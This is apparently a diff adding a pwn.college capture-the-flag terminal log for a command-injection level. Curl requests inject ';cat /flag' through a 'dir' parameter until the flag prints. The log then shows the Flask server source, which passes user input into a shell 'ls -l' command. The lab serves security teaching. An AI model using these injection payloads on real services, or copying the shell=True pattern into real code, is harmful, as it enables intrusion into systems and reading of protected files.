@@ -1,0 +1,77 @@
+        hacker@web-security~cmdi-3:/challenge$ curl "http://challenge.localhost:80/activity?dir=';%2Fflag"
+DEBUG: command="ls -l '';/flag'"
+127.0.0.1 - - [19/Oct/2025 16:40:31] "GET /activity?dir=';/flag HTTP/1.1" 200 -
+
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/activity"><input type=text name=dir><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l '';/flag':</b><br>
+        <pre>/bin/sh: 1: Syntax error: Unterminated quoted string
+</pre>
+        </body></html>
+        hacker@web-security~cmdi-3:/challenge$ curl "http://challenge.localhost:80/activity?dir=';cat%20%2Fflag"
+DEBUG: command="ls -l '';cat /flag'"
+127.0.0.1 - - [19/Oct/2025 16:40:44] "GET /activity?dir=';cat%20/flag HTTP/1.1" 200 -
+
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/activity"><input type=text name=dir><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l '';cat /flag':</b><br>
+        <pre>/bin/sh: 1: Syntax error: Unterminated quoted string
+</pre>
+        </body></html>
+        hacker@web-security~cmdi-3:/challenge$ curl "http://challenge.localhost:80/activity?dir=';cat%20%2Fflag'"
+DEBUG: command="ls -l '';cat /flag''"
+127.0.0.1 - - [19/Oct/2025 16:40:51] "GET /activity?dir=';cat%20/flag' HTTP/1.1" 200 -
+
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/activity"><input type=text name=dir><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l '';cat /flag'':</b><br>
+        <pre>ls: cannot access '': No such file or directory
+pwn.college{s0zcqg5ekKPdDAxJ2IHTQWf5y3T.dZjN1YDL1AjM5MzW}
+</pre>
+        </body></html>
+        hacker@web-security~cmdi-3:/challenge$ cat server 
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import subprocess
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/activity", methods=["GET"])
+def challenge():
+    arg = flask.request.args.get("dir", "/challenge")
+    command = f"ls -l '{arg}'"
+
+    print(f"DEBUG: {command=}")
+    result = subprocess.run(
+        command,  # the command to run
+        shell=True,  # use the shell to run this command
+        stdout=subprocess.PIPE,  # capture the standard output
+        stderr=subprocess.STDOUT,  # 2>&1
+        encoding="latin",  # capture the resulting output as text
+    ).stdout
+
+    return f"""
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/activity"><input type=text name=dir><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of {command}:</b><br>
+        <pre>{result}</pre>
+        </body></html>
+        """
+
+
+os.setuid(os.geteuid())
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = "challenge.localhost:80"
+app.run("challenge.localhost", 80)
